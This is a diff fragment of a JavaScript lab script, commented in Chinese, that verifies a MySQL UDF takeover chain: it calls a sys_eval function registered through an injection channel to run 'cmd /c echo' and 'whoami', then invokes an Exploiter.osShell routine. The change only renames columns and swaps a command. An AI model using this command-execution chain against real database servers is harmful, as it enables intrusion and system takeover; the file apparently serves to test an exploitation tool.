@@ -119,18 +119,18 @@ console.log(`[step3] 经注入通道执行 CREATE FUNCTION → mysql.func 中已
 
 // ④ 调用 sys_eval 执行系统命令（外部事实断言：返回值必须与命令输出一致）
 const marker = `udf_lab_${Date.now() % 100000}`;
-const cmdOut = await admin.query(`SELECT sys_eval('cmd /c echo ${marker}') AS out`);
-const outVal = String(cmdOut[0][0].out ?? '').trim();
+const cmdOut = await admin.query(`SELECT sys_eval('cmd /c echo ${marker}') AS cmd_out`);
+const outVal = String(cmdOut[0][0].cmd_out ?? '').trim();
 const cmdOk = outVal.includes(marker);
 console.log(`[step4] sys_eval 执行命令 → 输出=${JSON.stringify(outVal.slice(0, 80))} ${cmdOk ? '✅' : '❌'}`);
 
 // ⑤ 再验一个真实命令（whoami），确认不是回显巧合
-const who = await admin.query("SELECT sys_eval('whoami') AS u");
-const whoVal = String(who[0][0].u ?? '').trim();
+const who = await admin.query("SELECT sys_eval('whoami') AS whoami_val");
+const whoVal = String(who[0][0].whoami_val ?? '').trim();
 console.log(`[step5] sys_eval('whoami') → ${JSON.stringify(whoVal)}`);
 
 // ⑥ 经项目 osShell 能力调用（验证接管链路本身，而非只验 DLL）
-const osRes = await exploiter.osShell(ctx, 'whoami');
+const osRes = await exploiter.osShell(ctx, 'cmd /c echo osshell_ok');
 console.log(`[step6] Exploiter.osShell → ${JSON.stringify({ ok: osRes.ok, value: osRes.value ?? null, note: osRes.note })}`);
 
 const pass = registered >= 1 && cmdOk && whoVal.length > 0;
